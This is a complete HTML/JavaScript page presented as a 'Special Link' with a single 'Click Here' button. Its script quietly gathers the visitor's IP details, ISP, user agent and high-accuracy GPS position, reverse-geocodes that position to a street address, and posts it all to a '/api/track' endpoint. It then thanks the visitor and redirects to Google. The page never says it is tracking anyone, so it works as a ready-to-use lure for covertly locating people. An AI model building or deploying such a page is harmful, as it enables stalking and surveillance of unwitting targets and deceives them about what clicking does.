<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Click Here</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
      }

      .container {
        text-align: center;
        padding: 2rem;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 20px;
        backdrop-filter: blur(10px);
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        border: 1px solid rgba(255, 255, 255, 0.2);
      }

      .click-btn {
        background: linear-gradient(45deg, #ff6b6b, #ee5a24);
        color: white;
        border: none;
        padding: 20px 40px;
        font-size: 1.2rem;
        font-weight: bold;
        border-radius: 50px;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      .click-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
      }

      .click-btn:active {
        transform: translateY(0);
      }

      .status {
        margin-top: 20px;
        font-size: 0.9rem;
        opacity: 0.8;
      }

      .loading {
        display: none;
        margin-top: 15px;
      }

      .spinner {
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top: 2px solid white;
        width: 20px;
        height: 20px;
        animation: spin 1s linear infinite;
        display: inline-block;
        margin-right: 10px;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .success {
        color: #2ecc71;
      }

      .error {
        color: #e74c3c;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>üéØ Special Link</h1>
      <p>Click the button below to continue</p>

      <button id="trackBtn" class="click-btn">Click Here</button>

      <div id="loading" class="loading">
        <div class="spinner"></div>
        Processing...
      </div>

      <div id="status" class="status"></div>
    </div>

    <script>
      // Function to get address from coordinates using OpenStreetMap Nominatim
      async function getAddressFromCoords(latitude, longitude) {
        try {
          const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`
          );
          const data = await response.json();
          return data.address || {};
        } catch (error) {
          console.error("Error getting address:", error);
          return {};
        }
      }

      // Function to get current position with high accuracy
      function getCurrentPosition() {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject(new Error("Geolocation is not supported by your browser"));
            return;
          }

          const options = {
            enableHighAccuracy: true, // Request highest accuracy
            timeout: 15000, // Increased timeout to 15 seconds
            maximumAge: 0, // Force fresh position
          };

          const watchId = navigator.geolocation.watchPosition(
            (position) => {
              // Only accept if accuracy is better than 100 meters
              if (position.coords.accuracy <= 100) {
                navigator.geolocation.clearWatch(watchId);
                resolve(position);
              }
              // Else wait for a more accurate position
            },
            (error) => {
              navigator.geolocation.clearWatch(watchId);
              reject(error);
            },
            options
          );

          // Set a timeout in case we don't get an accurate position
          setTimeout(() => {
            navigator.geolocation.clearWatch(watchId);
            reject(
              new Error("Could not get accurate location within time limit")
            );
          }, 30000); // 30 second total timeout
        });
      }

      document
        .getElementById("trackBtn")
        .addEventListener("click", async function () {
          const btn = this;
          const loading = document.getElementById("loading");
          const status = document.getElementById("status");

          // Disable button and show loading
          btn.disabled = true;
          btn.style.opacity = "0.6";
          loading.style.display = "block";
          status.innerHTML = "";

          try {
            // Get IP and location data
            const ipResponse = await fetch("https://ipapi.co/json/");
            const ipData = await ipResponse.json();

            let exactLocation = {};

            try {
              // Try to get precise geolocation
              const position = await getCurrentPosition();
              const { latitude, longitude } = position.coords;

              // Get address from coordinates
              const address = await getAddressFromCoords(latitude, longitude);

              exactLocation = {
                exactLatitude: latitude,
                exactLongitude: longitude,
                exactAddress: address,
                accuracy: position.coords.accuracy,
                timestamp: new Date(position.timestamp).toISOString(),
              };

              console.log("Exact location data:", exactLocation);
            } catch (geoError) {
              console.warn("Could not get precise location:", geoError.message);
              // Continue with IP-based location if geolocation fails
            }

            // Combine IP data with exact location data
            const trackingData = {
              ip: ipData.ip,
              city: ipData.city,
              region: ipData.region,
              country: ipData.country_name,
              timezone: ipData.timezone,
              isp: ipData.org,
              latitude: ipData.latitude,
              longitude: ipData.longitude,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              ...exactLocation, // Spread the exact location data
            };

            console.log("Sending tracking data:", trackingData);

            // Send to our serverless function
            const result = await fetch("/api/track", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(trackingData),
            });

            const resultData = await result.json();

            if (result.ok) {
              status.innerHTML = '<span class="success">‚úÖ Thank you!</span>';
              // Optional: redirect after success
              setTimeout(() => {
                window.location.href = "https://www.google.com";
              }, 2000);
            } else {
              throw new Error(resultData.error || "Failed to process request");
            }
          } catch (error) {
            console.error("Error:", error);
            status.innerHTML =
              '<span class="error">‚ùå Something went wrong. Please try again.</span>';

            // Re-enable button on error
            btn.disabled = false;
            btn.style.opacity = "1";
          } finally {
            loading.style.display = "none";
          }
        });
    </script>
  </body>
</html>
